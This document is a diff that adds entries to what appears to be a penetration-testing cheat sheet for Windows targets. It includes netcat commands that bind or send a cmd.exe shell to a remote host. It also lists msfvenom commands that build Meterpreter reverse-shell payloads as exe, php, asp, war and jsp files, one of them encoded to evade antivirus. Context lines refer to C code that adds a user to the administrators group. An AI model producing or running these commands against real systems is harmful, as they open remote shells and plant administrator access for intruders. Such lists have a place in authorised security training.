@@ -1,3 +1,4 @@
+------------------------------------------------------------------------------
 # Basic C code to add kalisa user to the administrator group 
 
 #include <stdlib.h>
@@ -12,4 +13,30 @@ i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
 
 ------------------------------------------------------------------------------
 
+# Upload nc.exe on the box
+nc -nv <IP> <port> -e cmd.exe
+nc -nlvp <port> -e cmd.exe
 
+------------------------------------------------------------------------------
+
+Meterpreter Shells
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o evil.exe
+msfvenom -p windows/meterpreter/reverse_https LHOST= LPORT= -f exe -o evil.exe
+
+# encode the executable
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -e x86/shikata_ga_nai -o evil.exe
+
+# php
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f php > evil.php
+
+# asp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > evil.asp
+
+# war
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f war > evil.war
+
+# jsp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f jsp > evil.jsp
+
+------------------------------------------------------------------------------
